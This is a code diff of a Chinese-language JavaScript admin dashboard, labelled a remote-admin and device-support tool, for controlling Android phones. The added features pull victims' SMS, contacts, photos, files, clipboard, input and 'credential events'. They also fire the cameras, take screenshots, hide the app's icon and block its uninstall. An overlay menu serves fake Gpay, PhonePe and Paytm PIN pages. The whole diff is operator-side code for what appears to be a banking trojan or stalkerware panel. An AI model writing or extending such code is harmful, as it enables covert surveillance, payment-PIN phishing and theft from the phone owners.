@@ -32,26 +32,82 @@ const state = {
   wsPing: null,
   refreshTimer: null,
   manualSocketClose: false,
+  workbench: {
+    scale: 100,
+    fontSize: 16,
+    keyStep: 100,
+    theme: "default",
+    overlayMode: "隐藏",
+  },
 };
 
 const viewMeta = {
   dashboard: ["REMOTE ADMIN", "首页"],
   devices: ["DEVICE INVENTORY", "设备列表"],
+  commands: ["COMMAND AUDIT", "命令历史"],
   templates: ["SUPPORT TEMPLATES", "消息模板"],
+  configuration: ["DEVICE CONFIGURATION", "设备配置"],
   users: ["ADMINISTRATORS", "管理员"],
   builds: ["APK BUILDER", "编译打包"],
   capabilities: ["CAPABILITY MATRIX", "功能清单"],
+  system: ["CONNECTION & SYSTEM", "连接与系统"],
 };
 
 const actionLabels = {
-  refresh_status: "刷新设备状态",
+  refresh_status: "刷新",
   show_support_prompt: "显示支持说明",
   open_battery_settings: "打开电池设置",
   open_autostart_settings: "打开自启动设置",
-  request_screen_share: "请求屏幕共享",
+  request_screen_share: "显示投屏",
   stop_screen_share: "停止屏幕共享",
   lock_device: "锁定设备",
   "command.create": "管理员创建命令",
+};
+
+const workbenchActionLabels = {
+  unlock: "一键解锁",
+  "verify-unlock": "已解锁 · 锁屏验证",
+  translate: "一键翻译",
+  "lock-screen": "锁屏",
+  "uninstall-protection": "防删",
+  "launcher-icon": "桌面图标",
+  "power-menu": "电源",
+  screenshot: "截图",
+  "front-camera": "前-拍照",
+  "rear-camera": "后-拍照",
+  camera: "打开实时预览",
+  "open-app": "打开应用",
+  "uninstall-app": "卸载应用",
+  "overlay-mode": "遮盖层/仿页",
+  "clear-clipboard": "清空剪切板",
+  "write-clipboard": "写入剪切板",
+};
+
+const workbenchModuleLabels = {
+  messages: "短信",
+  apps: "应用",
+  system: "系统",
+  permissions: "权限",
+  gallery: "相册",
+  contacts: "通讯录",
+  files: "文件",
+  clipboard: "剪切板",
+  "input-events": "输入事件",
+  "credential-events": "凭据事件",
+  camera: "摄像头数据",
+};
+
+const workbenchEmptyLabels = {
+  messages: "暂无数据~",
+  apps: "暂无数据~",
+  permissions: "暂无数据~",
+  gallery: "暂无数据~",
+  contacts: "暂无数据~",
+  files: "暂无权限",
+  clipboard: "读取失败或文本为空",
+  "input-events": "暂无数据~",
+  "credential-events": "暂无数据~",
+  camera: "暂无数据~",
 };
 
 class ApiError extends Error {
@@ -92,6 +148,11 @@ function errorMessage(body, status) {
       "device is offline": "设备当前离线，命令未下发",
       "device not found": "设备不存在或无权访问",
       "this action accepts no payload": "该操作不接受附加参数",
+      "this action accepts no value": "该操作不接受该值",
+      "package_name is required": "请选择要操作的应用",
+      "invalid package_name": "应用包名格式不正确",
+      "clipboard text is required": "请输入剪切板内容",
+      "invalid clipboard text": "剪切板内容格式不正确或过长",
     };
     return map[detail] || detail;
   }
@@ -215,10 +276,17 @@ async function restoreSession() {
 
 async function startAuthenticatedApp() {
   const requested = location.hash.replace("#", "");
-  showView(viewMeta[requested] ? requested : "dashboard", false);
+  const initialView = viewMeta[requested] ? requested : "dashboard";
+  showView(initialView, false, false);
+  const initialLoader = {
+    commands: loadCommands,
+    configuration: loadBatteryGuides,
+    capabilities: loadCapabilities,
+  }[initialView];
   await Promise.allSettled([
     loadOverview(), loadDevices(), loadGroups(), loadTemplates(),
     state.user?.role === "admin" ? loadUsers() : Promise.resolve(),
+    initialLoader ? initialLoader() : Promise.resolve(),
   ]);
   connectDashboardSocket();
 }
@@ -249,7 +317,7 @@ function forceLogout(message = "") {
   showLogin(message);
 }
 
-function showView(view, updateHash = true) {
+function showView(view, updateHash = true, loadData = true) {
   if (!viewMeta[view]) return;
   if (["users", "builds"].includes(view) && state.user?.role !== "admin") {
     showToast("当前账号没有访问该页面的权限", "error");
@@ -262,11 +330,15 @@ function showView(view, updateHash = true) {
   $("#page-title").textContent = viewMeta[view][1];
   $("#sidebar").classList.remove("open");
   if (updateHash) history.replaceState(null, "", `#${view}`);
-  if (view === "dashboard") loadOverview();
-  if (view === "devices") loadDevices();
-  if (view === "templates") loadTemplates();
-  if (view === "users") loadUsers();
-  if (view === "capabilities") loadCapabilities();
+  if (loadData) {
+    if (view === "dashboard") loadOverview();
+    if (view === "devices") loadDevices();
+    if (view === "commands") loadCommands();
+    if (view === "templates") loadTemplates();
+    if (view === "configuration") loadConfiguration();
+    if (view === "users") loadUsers();
+    if (view === "capabilities") loadCapabilities();
+  }
 }
 
 async function loadCapabilities() {
@@ -277,7 +349,7 @@ async function loadCapabilities() {
     $("#capability-implemented").textContent = summary.implemented;
     $("#capability-planned").textContent = summary.not_implemented;
     $("#capability-blocked").textContent = summary.unavailable;
-    const labels = { implemented: "已实现", not_implemented: "未实现", unavailable: "不能做" };
+    const labels = { implemented: "已实现", not_implemented: "未实现", unavailable: "未启用" };
     let currentGroup = "";
     $("#capability-list").innerHTML = items.map((item) => {
       const group = item.group !== currentGroup
@@ -285,11 +357,21 @@ async function loadCapabilities() {
         : "";
       currentGroup = item.group;
       const interfaces = item.interfaces.map((value) => `<code>${escapeHtml(value)}</code>`).join("");
+      const sent = item.send_to_android == null
+        ? "不向 Android 发送消息"
+        : JSON.stringify(item.send_to_android, null, 2);
+      const received = item.receive_from_android == null
+        ? "不接收 Android 命令回执"
+        : JSON.stringify(item.receive_from_android, null, 2);
       return `${group}<article class="capability-row ${item.status}">
-        <div><h3>${escapeHtml(item.name)}</h3></div>
+        <div class="capability-title"><h3>${escapeHtml(item.name)}</h3><span class="capability-status ${item.status}">${labels[item.status]}</span></div>
         <div class="capability-interfaces">${interfaces}</div>
+        <div class="capability-protocol-grid">
+          <section><b>发送给 Android</b><pre>${escapeHtml(sent)}</pre></section>
+          <section><b>接收 Android</b><pre>${escapeHtml(received)}</pre></section>
+        </div>
+        <div class="capability-storage"><b>后台记录</b><code>${escapeHtml(item.stored_as)}</code></div>
         <p>${escapeHtml(item.note)}</p>
-        <span class="capability-status ${item.status}">${labels[item.status]}</span>
       </article>`;
     }).join("");
   } catch (error) {
@@ -336,7 +418,7 @@ function renderCommands() {
       return `<tr>
         <td><code class="command-id" title="${escapeHtml(command.id)}">${escapeHtml(command.id)}</code></td>
         <td><strong>${escapeHtml(command.device_name)}</strong><span class="device-subline">${escapeHtml(command.device_id)}</span></td>
-        <td>${escapeHtml(actionLabels[command.action] || command.action)}</td>
+        <td>${escapeHtml(actionLabels[command.action] || workbenchActionLabels[command.action] || command.action)}</td>
         <td>${escapeHtml(command.operator_name)}</td>
         <td><span class="command-state ${command.status}">${labels[command.status] || escapeHtml(command.status)}</span></td>
         <td>${formatTime(command.queued_at)}</td><td>${formatTime(command.completed_at)}</td>
@@ -599,25 +681,156 @@ async function submitReservedBuildProfile(event) {
   }
 }
 
-async function callReservedWorkbenchAction(action, currentValue) {
+async function callReservedWorkbenchAction(action, value = null, payload = {}) {
   if (!state.selectedDeviceId) return;
   try {
     await api(`/api/devices/${encodeURIComponent(state.selectedDeviceId)}/workbench-actions/${encodeURIComponent(action)}`, {
       method: "POST",
       body: JSON.stringify({
-        value: currentValue === undefined ? null : currentValue !== "true",
-        payload: {},
+        value,
+        payload,
       }),
     });
+    showToast(`发送命令成功: ${workbenchActionLabels[action] || action}。具体结果会在处理完毕时通知`);
+    return true;
   } catch (error) {
     showToast(error.message, "error");
+    return false;
   }
 }
 
-async function checkReservedWorkbenchModule(module) {
+function workbenchItems(data) {
+  if (Array.isArray(data)) return data;
+  return Array.isArray(data?.items) ? data.items : [];
+}
+
+function itemValue(item, ...keys) {
+  for (const key of keys) {
+    if (item?.[key] !== undefined && item?.[key] !== null && item?.[key] !== "") return item[key];
+  }
+  return "—";
+}
+
+function formatBytes(value) {
+  const number = Number(value);
+  if (!Number.isFinite(number) || number < 0) return value == null ? "—" : String(value);
+  if (number < 1024) return `${number} B`;
+  const units = ["KB", "MB", "GB", "TB"];
+  let size = number / 1024;
+  let index = 0;
+  while (size >= 1024 && index < units.length - 1) {
+    size /= 1024;
+    index += 1;
+  }
+  return `${size.toFixed(size >= 10 ? 1 : 2)} ${units[index]}`;
+}
+
+function safeMediaUrl(value) {
+  if (typeof value !== "string") return "";
+  if (/^(https?:\/\/|\/[^/]|data:image\/(?:png|jpeg|webp|gif);base64,)/i.test(value)) return value;
+  return "";
+}
+
+function renderWorkbenchModule(module, data, completedAt) {
+  const items = workbenchItems(data);
+  const disabled = canOperateSelectedDevice() ? "" : "disabled";
+  const head = `<div class="module-result-head"><strong>处理结果</strong><small>${formatTime(completedAt)}</small><button type="button" data-reserved-module="${escapeHtml(module)}" ${disabled}>刷新</button></div>`;
+  const empty = `<div class="loading-block">${escapeHtml(workbenchEmptyLabels[module] || "暂无数据~")}</div>`;
+  if (module === "messages") {
+    if (!items.length) return head + empty;
+    return head + `<div class="message-cards">${items.map((item) => {
+      const direction = itemValue(item, "direction", "type") === "sent" ? "发出" : "收到";
+      const read = item.read === true || item.read === 1;
+      return `<article class="message-card"><div><strong>${escapeHtml(itemValue(item, "address", "phone", "sender"))}</strong><span>${escapeHtml(direction)} · ${escapeHtml(itemValue(item, "slot", "sim_slot"))}${read ? " · 已读" : ""}</span></div><p>${escapeHtml(itemValue(item, "body", "content", "text"))}</p><small>${formatTime(itemValue(item, "timestamp", "created_at", "time"))}</small><button type="button" data-copy-text="${escapeHtml(itemValue(item, "body", "content", "text"))}">复制</button></article>`;
+    }).join("")}</div>`;
+  }
+  if (module === "apps") {
+    if (!items.length) return head + empty;
+    return head + `<div class="module-tools"><select data-app-filter><option value="">APP · 全部</option>${[...new Set(items.map((item) => String(item.tag || item.type || "")).filter(Boolean))].map((tag) => `<option value="${escapeHtml(tag)}">${escapeHtml(tag)}</option>`).join("")}</select><select data-app-mark><option value="">标记 · 全部</option><option value="system">系统</option><option value="third-party">三方APP</option></select><input data-app-search placeholder="搜索 APP 名称或包名"></div><div class="app-cards">${items.map((item) => {
+      const packageName = itemValue(item, "package_name", "package");
+      const name = itemValue(item, "name", "app_name", "label");
+      const icon = safeMediaUrl(item.icon || item.icon_url);
+      const tag = String(item.tag || item.type || "");
+      const mark = item.system === true || tag.toLowerCase() === "system" ? "system" : "third-party";
+      const haystack = `${name} ${packageName}`.toLowerCase();
+      return `<article class="app-card" data-app-card data-app-tag="${escapeHtml(tag)}" data-app-mark-value="${mark}" data-app-search-value="${escapeHtml(haystack)}"><div class="app-icon">${icon ? `<img src="${escapeHtml(icon)}" alt="">` : escapeHtml(String(name).slice(0, 1).toUpperCase())}</div><div><strong>${escapeHtml(name)}</strong><small>${escapeHtml(packageName)}</small><span>${escapeHtml(itemValue(item, "version", "version_name"))}</span></div><div class="app-card-actions"><button type="button" data-app-action="open-app" data-package-name="${escapeHtml(packageName)}" ${disabled}>打开</button><button type="button" class="danger" data-app-action="uninstall-app" data-package-name="${escapeHtml(packageName)}" ${disabled}>卸载</button></div></article>`;
+    }).join("")}</div>`;
+  }
+  if (module === "system") {
+    const system = data && typeof data === "object" ? data : {};
+    const fields = [
+      ["当前窗口", itemValue(system, "current_window", "window")], ["当前包名", itemValue(system, "current_package", "package_name")],
+      ["控制包名", itemValue(system, "control_package")], ["应用名称", itemValue(system, "app_name")],
+      ["用户时区", itemValue(system, "timezone")], ["用户语言", itemValue(system, "locale", "language")],
+      ["终端时间", itemValue(system, "device_time", "terminal_time")], ["最后点击", itemValue(system, "last_click")],
+      ["手机品牌", itemValue(system, "brand")], ["手机型号", itemValue(system, "model")],
+      ["安卓版本", itemValue(system, "android_version")], ["是否插卡", itemValue(system, "sim_present")],
+      ["号码1", itemValue(system, "phone_number", "phone_number_1")], ["有效内存", itemValue(system, "available_memory")],
+      ["总计内存", itemValue(system, "total_memory")], ["CPU", itemValue(system, "cpu")],
+    ];
+    return head + `<div class="detail-grid module-detail-grid">${fields.map(([label, value]) => detailItem(label, value)).join("")}</div>`;
+  }
+  if (module === "permissions") {
+    if (!items.length) return head + empty;
+    const enabledCount = items.filter((item) => [true, 1, "granted", "enabled"].includes(item.state ?? item.enabled)).length;
+    return head + `<div class="permission-summary"><b>已开 ${enabledCount}</b><span>待开 ${items.length - enabledCount}</span><span>共 ${items.length}</span></div><div class="permission-list">${items.map((item) => permissionRow(itemValue(item, "label", "name", "permission"), item.state ?? item.enabled)).join("")}</div>`;
+  }
+  if (module === "gallery") {
+    if (!items.length) return head + empty;
+    return head + `<div class="gallery-grid">${items.map((item) => {
+      const url = safeMediaUrl(item.thumbnail || item.url || item.uri);
+      return `<article>${url ? `<img src="${escapeHtml(url)}" alt="${escapeHtml(itemValue(item, "name"))}">` : `<div class="gallery-placeholder">▧</div>`}<strong>${escapeHtml(itemValue(item, "name", "display_name"))}</strong><small>${escapeHtml(formatBytes(item.size))}</small></article>`;
+    }).join("")}</div>`;
+  }
+  if (module === "contacts") {
+    if (!items.length) return head + empty;
+    return head + `<div class="contact-list">${items.map((item) => `<article><span>${escapeHtml(String(itemValue(item, "name")).slice(0, 1))}</span><div><strong>${escapeHtml(itemValue(item, "name"))}</strong><small>${escapeHtml(itemValue(item, "phone", "number"))}</small></div><button type="button" data-copy-text="${escapeHtml(itemValue(item, "phone", "number"))}">复制</button></article>`).join("")}</div>`;
+  }
+  if (module === "files") {
+    if (!items.length) return head + empty;
+    return head + `<div class="file-path">根目录：${escapeHtml(data?.path || "/")}</div><div class="table-wrap"><table class="module-table"><thead><tr><th>名称</th><th>大小</th><th>修改时间</th><th>操作</th></tr></thead><tbody>${items.map((item) => `<tr><td>${item.type === "directory" ? "▰" : "▤"} ${escapeHtml(itemValue(item, "name"))}</td><td>${escapeHtml(item.type === "directory" ? "—" : formatBytes(item.size))}</td><td>${formatTime(itemValue(item, "modified_at", "updated_at"))}</td><td>${item.uri ? `<button type="button" data-copy-text="${escapeHtml(item.uri)}">复制路径</button>` : "—"}</td></tr>`).join("")}</tbody></table></div>`;
+  }
+  if (module === "clipboard") {
+    const text = typeof data === "string" ? data : String(data?.text ?? "");
+    return head + `<div class="clipboard-panel"><label>剪切板内容<textarea data-clipboard-text>${escapeHtml(text)}</textarea></label><div><button type="button" data-reserved-action="clear-clipboard" ${disabled}>清空</button></div><label>写入剪切板<textarea data-clipboard-write placeholder="请输入内容"></textarea></label><button type="button" class="primary-button small" data-clipboard-submit ${disabled}>提交写入</button></div>`;
+  }
+  return head + `<pre>${escapeHtml(JSON.stringify(data, null, 2))}</pre>`;
+}
+
+async function loadWorkbenchModule(module) {
+  if (!state.selectedDeviceId) return;
+  const target = $(`[data-workbench-result="${module}"]`, $("#drawer-content"));
+  if (target) target.innerHTML = `<div class="loading-block">正在读取数据…</div>`;
+  try {
+    const result = await api(`/api/devices/${encodeURIComponent(state.selectedDeviceId)}/workbench/${encodeURIComponent(module)}`);
+    if (!target) return;
+    const report = result.data;
+    if (report.source !== "android_self_reported" || report.data == null) {
+      const status = report.last_command?.status;
+      const copy = status === "sent" || status === "acknowledged"
+        ? "查询命令已发送，等待处理结果"
+        : status === "failed"
+          ? `处理失败：${report.last_command.error_message || report.last_command.error_code || "未知错误"}`
+          : workbenchEmptyLabels[module] || "暂无数据~";
+      target.innerHTML = `<div class="loading-block">${escapeHtml(copy)}</div>`;
+      return;
+    }
+    target.classList.add("structured-result");
+    target.innerHTML = renderWorkbenchModule(module, report.data, report.last_command?.completed_at);
+    target.closest(".module-placeholder")?.classList.add("has-data");
+  } catch (error) {
+    if (target) target.innerHTML = `<div class="loading-block">${escapeHtml(error.message)}</div>`;
+  }
+}
+
+async function requestWorkbenchModule(module) {
   if (!state.selectedDeviceId) return;
   try {
-    await api(`/api/devices/${encodeURIComponent(state.selectedDeviceId)}/workbench/${encodeURIComponent(module)}`);
+    const result = await api(`/api/devices/${encodeURIComponent(state.selectedDeviceId)}/workbench/${encodeURIComponent(module)}/request`, {
+      method: "POST",
+    });
+    showToast(`发送命令成功: ${workbenchModuleLabels[module] || module}。具体结果会在处理完毕时通知`);
+    await loadWorkbenchModule(module);
   } catch (error) {
     showToast(error.message, "error");
   }
@@ -636,9 +849,6 @@ async function loadOverview() {
     $("#metric-rate").textContent = `${rate}%`;
     $("#metric-online-copy").textContent = `共 ${total} 台设备`;
     $("#nav-device-count").textContent = total;
-    $("#summary-total").textContent = total;
-    $("#summary-online").textContent = online;
-    $("#summary-offline").textContent = offline;
     $("#health-rate").textContent = `${rate}%`;
     $(".health-ring").style.setProperty("--health-angle", `${rate}%`);
   } catch (error) {
@@ -725,6 +935,18 @@ function permissionBadge(label, value) {
   return `<span class="permission-badge ${active ? "yes" : ""}">${escapeHtml(label)} ${active ? "✓" : "—"}</span>`;
 }
 
+function countryFlag(locale) {
+  const match = String(locale || "").match(/[-_]([A-Za-z]{2})$/);
+  if (!match) return "🌐";
+  return [...match[1].toUpperCase()].map((letter) => String.fromCodePoint(127397 + letter.charCodeAt(0))).join("");
+}
+
+function realtimeStateIcon(label, symbol, value) {
+  const className = value === true || value === 1 ? "enabled" : value === false || value === 0 ? "disabled" : "unknown";
+  const copy = value == null ? "未知" : value ? "已开启" : "未开启";
+  return `<span class="${className}" title="${escapeHtml(label)}：${copy}">${symbol}</span>`;
+}
+
 function renderDeviceTable() {
   const body = $("#device-table-body");
   const empty = $("#device-empty");
@@ -736,14 +958,14 @@ function renderDeviceTable() {
   empty.classList.add("hidden");
   body.innerHTML = state.devices.map((device) => `
     <tr class="clickable-device-row" data-device-id="${escapeHtml(device.id)}">
-      <td><div class="realtime-icons"><i class="${device.online ? "on" : ""}"></i><span title="无障碍">♿</span><span title="防删">▣</span><b>🌐</b></div></td>
+      <td><div class="realtime-icons"><i class="${device.online ? "on" : ""}" title="${device.online ? "在线" : "离线"}"></i>${realtimeStateIcon("无障碍", "♿", device.accessibility_enabled)}${realtimeStateIcon("防删", "▣", device.uninstall_protection_enabled)}<b title="${escapeHtml(device.locale || "地区未知")}">${countryFlag(device.locale)}</b></div></td>
       <td><strong class="device-name">${escapeHtml(device.id)}</strong><span class="device-subline">${escapeHtml(device.name)}</span></td>
       <td><strong>${escapeHtml(device.brand)}</strong><span class="device-subline">${escapeHtml(device.model)}</span></td>
       <td>${batteryHtml(device.battery_percent)}</td>
       <td><span class="network-quality ${device.online ? "good" : ""}">${escapeHtml(device.network_quality || (device.online ? "良好" : "—"))}${device.network_latency_ms ? ` · ${escapeHtml(device.network_latency_ms)} ms` : ""}</span></td>
       <td>${escapeHtml(device.note || "—")}</td>
       <td>${screenLabel(device.screen_state)}</td>
-      <td>${device.locked ? "✓" : "×"}</td>
+      <td>${device.locked == null ? "—" : device.locked ? "✓" : "×"}</td>
       <td><span class="network-type-pill">${escapeHtml(device.network_type || "—")}</span></td>
       <td>${escapeHtml(device.locale || "—")}</td>
       <td>${escapeHtml(device.ip_address || "—")}</td>
@@ -787,6 +1009,10 @@ function detailItem(label, value) {
   return `<div class="detail-item"><span>${escapeHtml(label)}</span><strong>${escapeHtml(value ?? "—")}</strong></div>`;
 }
 
+function canOperateSelectedDevice() {
+  return Boolean(state.selectedDevice?.online && ["admin", "operator"].includes(state.user?.role));
+}
+
 function renderDeviceDetail(device, events) {
   state.selectedDevice = device;
   $("#drawer-device-name").textContent = device.name;
@@ -794,8 +1020,12 @@ function renderDeviceDetail(device, events) {
   const canEdit = ["admin", "operator"].includes(state.user.role);
   const actionDisabled = canOperate ? "" : "disabled";
   const groupOptions = [`<option value="">未分组</option>`, ...state.groups.map((group) => `<option value="${escapeHtml(group.id)}" ${device.group_id === group.id ? "selected" : ""}>${escapeHtml(group.name)}</option>`)].join("");
-  const eventHtml = events.length ? events.map((event) => `
-    <div class="event-item"><i></i><div><strong>${escapeHtml(actionLabels[event.action] || event.action)} · ${escapeHtml(event.result)}</strong><small>${formatTime(event.created_at)}</small></div></div>`).join("") : `<p class="muted">暂无审计事件</p>`;
+  const eventHtml = events.length ? events.map((event) => {
+    const label = actionLabels[event.action] || workbenchActionLabels[event.action] || event.action;
+    const category = event.action.includes("lock") ? "锁屏" : event.action.includes("app") ? "三方APP" : "应用锁";
+    const search = `${label} ${event.result} ${JSON.stringify(event.details || {})}`.toLowerCase();
+    return `<div class="event-item" data-log-item data-log-category="${escapeHtml(category)}" data-log-search="${escapeHtml(search)}"><i></i><div><strong>${escapeHtml(label)} · ${escapeHtml(event.result)}</strong><small>${formatTime(event.created_at)}</small></div></div>`;
+  }).join("") : `<p class="muted">暂无审计事件</p>`;
   $("#drawer-content").innerHTML = `
     <div class="detail-hero">
       <div class="device-avatar">▯</div>
@@ -805,12 +1035,14 @@ function renderDeviceDetail(device, events) {
     <div class="workbench-toolbar">
       <div><span>网络：</span><b>${escapeHtml(device.network_quality || (device.online ? "良好" : "未知"))}</b></div>
       <div><span>电池：</span><b>${device.battery_percent == null ? "—" : `${device.battery_percent}%`}</b></div>
-      <label>设备<select><option>Android 设备</option></select></label>
-      <label>宽高 / 缩放<input type="range" min="70" max="130" value="100"></label>
-      <label>字体大小<input type="range" min="12" max="22" value="16"></label>
-      <button class="secondary-button small" type="button">重置布局</button>
+      <label>设备<select disabled><option>Android 设备</option></select></label>
+      <label>宽高 / 缩放<input data-workbench-scale type="range" min="70" max="130" value="${state.workbench.scale}"><output data-workbench-scale-output>${state.workbench.scale}%</output></label>
+      <label>字体大小<input data-workbench-font type="range" min="12" max="22" value="${state.workbench.fontSize}"><output data-workbench-font-output>${state.workbench.fontSize}px</output></label>
+      <label>快捷键步长<select data-workbench-key-step><option value="50">50</option><option value="100" ${state.workbench.keyStep === 100 ? "selected" : ""}>100</option><option value="200" ${state.workbench.keyStep === 200 ? "selected" : ""}>200</option></select></label>
+      <label>主题背景<select data-workbench-theme><option value="default" ${state.workbench.theme === "default" ? "selected" : ""}>默认</option><option value="light" ${state.workbench.theme === "light" ? "selected" : ""}>浅色</option><option value="dark" ${state.workbench.theme === "dark" ? "selected" : ""}>深色</option></select></label>
+      <button class="secondary-button small" data-workbench-reset type="button">重置布局</button>
     </div>
-    <div class="device-workbench">
+    <div class="device-workbench theme-${escapeHtml(state.workbench.theme)}" style="font-size:${state.workbench.fontSize}px;--wb-control-font:${state.workbench.fontSize * 0.625}px;--wb-small-font:${state.workbench.fontSize * 0.56}px;zoom:${state.workbench.scale / 100}">
       <section class="workbench-data-panel">
         <div class="workbench-tabs" role="tablist">
           <button class="active" data-workbench-tab="logs">◴ 日志</button>
@@ -824,65 +1056,175 @@ function renderDeviceDetail(device, events) {
           <button data-workbench-tab="clipboard">✂ 剪切板</button>
         </div>
         <div class="workbench-panel active" data-workbench-panel="logs">
-          <div class="material-status-tabs"><button class="active">全部</button><button>三方APP</button><button>锁屏</button><button>应用锁</button></div>
-          <div class="search-box"><span>⌕</span><input placeholder="搜索：网址/APP名称/内容等"></div>
-          <div class="reserved-module-banner">输入/凭据日志占位：GET /api/devices/${encodeURIComponent(device.id)}/workbench/input-events 与 /credential-events · 均返回 501</div>
+          <div class="material-status-tabs" data-log-filters><button class="active" data-log-filter="">全部</button><button data-log-filter="三方APP">三方APP</button><button data-log-filter="锁屏">锁屏</button><button data-log-filter="应用锁">应用锁</button></div>
+          <div class="search-box"><span>⌕</span><input data-log-search placeholder="搜索：网址/APP名称/内容等"></div>
           <div class="event-list">${eventHtml}</div>
+          <p class="muted hidden" data-log-empty>没有符合条件的日志</p>
         </div>
         <div class="workbench-panel" data-workbench-panel="messages">${workbenchPlaceholder("短信", device.id, "messages")}</div>
-        <div class="workbench-panel" data-workbench-panel="apps"><h4>点击图标打开APP</h4>${workbenchPlaceholder("应用列表、打开与卸载", device.id, "apps")}</div>
+        <div class="workbench-panel" data-workbench-panel="apps"><h4>点击图标打开APP</h4>${workbenchPlaceholder("应用", device.id, "apps")}</div>
         <div class="workbench-panel" data-workbench-panel="system"><div class="detail-grid">
           ${detailItem("当前窗口", "—")}${detailItem("当前包名", "—")}${detailItem("控制包名", device.package_name)}
           ${detailItem("应用名称", device.name)}${detailItem("用户时区", device.timezone || "—")}${detailItem("用户语言", device.locale || "—")}
-          ${detailItem("手机品牌", device.brand)}${detailItem("手机型号", device.model)}${detailItem("安卓版本", `Android ${device.android_version} (SDK ${device.sdk_int})`)}
-        </div><div class="camera-actions"><button data-reserved-action="front-camera">前拍照</button><button data-reserved-action="rear-camera">后拍照</button><button data-reserved-action="camera">打开实时预览</button></div></div>
-        <div class="workbench-panel" data-workbench-panel="permissions"><div class="permission-header"><h3>权限管理 <small>手动引导授权</small></h3><label><input type="checkbox"> 自动化</label><button data-action="refresh_status">↻ 刷新</button></div><div class="permission-list">
+          ${detailItem("终端时间", "—")}${detailItem("最后点击", "—")}${detailItem("手机品牌", device.brand)}
+          ${detailItem("手机型号", device.model)}${detailItem("安卓版本", `Android ${device.android_version} (SDK ${device.sdk_int})`)}${detailItem("是否插卡", "—")}
+          ${detailItem("号码1", "—")}${detailItem("有效内存", "—")}${detailItem("总计内存", "—")}${detailItem("CPU", "—")}
+        </div><div class="camera-copy"><strong>摄像头</strong><small>点击拍照图片在 截图 查看</small></div><div class="camera-actions"><button data-reserved-action="front-camera" ${actionDisabled}>前-拍照</button><button data-reserved-action="rear-camera" ${actionDisabled}>后-拍照</button><button data-reserved-action="camera" ${actionDisabled}>打开实时预览</button></div><div class="module-result action-media-result" data-action-result="camera"></div><button class="secondary-button small" data-reserved-module="system" ${actionDisabled}>刷新系统信息</button><div class="module-result" data-workbench-result="system"></div></div>
+        <div class="workbench-panel" data-workbench-panel="permissions"><div class="permission-header"><h3>权限管理 <small>手动引导授权</small></h3><label><input type="checkbox" ${actionDisabled}> 自动化</label><button data-action="refresh_status" ${actionDisabled}>↻ 刷新</button></div><div class="permission-list">
           ${permissionRow("无障碍权限", device.accessibility_enabled)}${permissionRow("电池白名单", device.battery_whitelist_enabled)}${permissionRow("短信权限", null)}${permissionRow("相册权限", null)}${permissionRow("自动启动", null)}${permissionRow("管理员", device.device_admin_enabled)}
-        </div><div class="reserved-module-banner">GET /api/devices/${encodeURIComponent(device.id)}/workbench/permissions · 未接入字段返回 501</div></div>
+        </div><button class="secondary-button small" data-reserved-module="permissions" ${actionDisabled}>刷新</button><div class="module-result" data-workbench-result="permissions"><div class="loading-block">暂无数据~</div></div></div>
         <div class="workbench-panel" data-workbench-panel="gallery">${workbenchPlaceholder("相册", device.id, "gallery")}</div>
         <div class="workbench-panel" data-workbench-panel="contacts">${workbenchPlaceholder("通讯录", device.id, "contacts")}</div>
-        <div class="workbench-panel" data-workbench-panel="files">${workbenchPlaceholder("文件", device.id, "files")}</div>
-        <div class="workbench-panel" data-workbench-panel="clipboard">${workbenchPlaceholder("剪切板", device.id, "clipboard")}</div>
+        <div class="workbench-panel" data-workbench-panel="files">${workbenchPlaceholder("根目录", device.id, "files")}</div>
+        <div class="workbench-panel" data-workbench-panel="clipboard">${workbenchPlaceholder("剪切板内容", device.id, "clipboard")}</div>
+      </section>
+      <section class="overlay-mode-panel">
+        <strong>遮盖层/仿页</strong>
+        <select data-reserved-action="overlay-mode" ${actionDisabled}>${["纯黑色", "纯白色", "隐藏", "Gpay PIN", "Phonepe PIN", "Paytm PIN"].map((mode) => `<option ${state.workbench.overlayMode === mode ? "selected" : ""}>${mode}</option>`).join("")}</select>
+        <small>选择后向 Android 发送对应 mode</small>
       </section>
       <section class="remote-stage-panel">
-        <div class="overlay-picker"><strong>遮盖层/仿页</strong><select data-reserved-action="overlay-mode"><option>纯黑色</option><option>纯白色</option><option>隐藏</option><option>Gpay PIN</option><option>PhonePe PIN</option><option>Paytm PIN</option></select></div>
-        <div class="phone-frame"><div class="phone-camera"></div><div class="phone-screen"><span>${device.online ? "设备在线" : "设备离线"}</span><small>打开投屏后显示经用户授权的画面</small><button data-action="request_screen_share" ${actionDisabled}>打开投屏应用</button></div></div>
+        <div class="phone-frame"><div class="phone-camera"></div><div class="phone-screen"><small>打开投屏显示</small><button data-action="request_screen_share" ${actionDisabled}>立即打开</button></div></div>
       </section>
       <aside class="remote-control-panel">
         <div class="remote-state"><span class="status-badge ${device.online ? "online" : "offline"}">${device.online ? "在线" : "离线"}</span><b>${screenLabel(device.screen_state)}</b></div>
-        <button class="wide-control green" data-reserved-action="unlock">▣ 一键解锁</button>
+        <button class="wide-control green" data-reserved-action="unlock" ${actionDisabled}>▣ 一键解锁</button>
         <div class="inline-controls"><button data-action="request_screen_share" ${actionDisabled}>显示投屏</button><button data-action="refresh_status" ${actionDisabled}>↻ 刷新</button></div>
-        <button class="wide-control" data-reserved-action="translate">文 一键翻译</button>
-        <button class="wide-control green" data-reserved-action="unlock">▣ 已解锁 · 锁屏验证</button>
-        ${controlToggle("锁屏", "已锁屏，关掉即可亮屏", "lock-screen", device.locked)}
-        ${controlToggle("防删", "防止应用被卸载", "uninstall-protection", device.uninstall_protection_enabled)}
-        ${controlToggle("桌面图标", "显示或隐藏应用图标", "launcher-icon", device.launcher_icon_visible)}
-        <button class="control-list-button" data-reserved-action="power-menu"><span>⏻</span><div><b>电源</b><small>弹出电源菜单</small></div></button>
-        <button class="control-list-button" data-reserved-action="screenshot"><span>▧</span><div><b>截图</b><small>截取当前屏幕</small></div></button>
-        <button class="control-list-button" data-action="show_support_prompt" ${actionDisabled}><span>?</span><div><b>消息模板</b><small>显示支持说明</small></div></button>
+        <button class="wide-control" data-reserved-action="translate" ${actionDisabled}>文 一键翻译</button>
+        <button class="wide-control green" data-reserved-action="verify-unlock" ${actionDisabled}>▣ 已解锁 · 锁屏验证</button>
+        ${controlToggle("锁屏", "打开后立刻锁屏", "lock-screen", device.locked, actionDisabled)}
+        ${controlToggle("防删", "防止应用被卸载", "uninstall-protection", device.uninstall_protection_enabled, actionDisabled)}
+        ${controlToggle("桌面图标", "显示或隐藏应用图标", "launcher-icon", device.launcher_icon_visible, actionDisabled)}
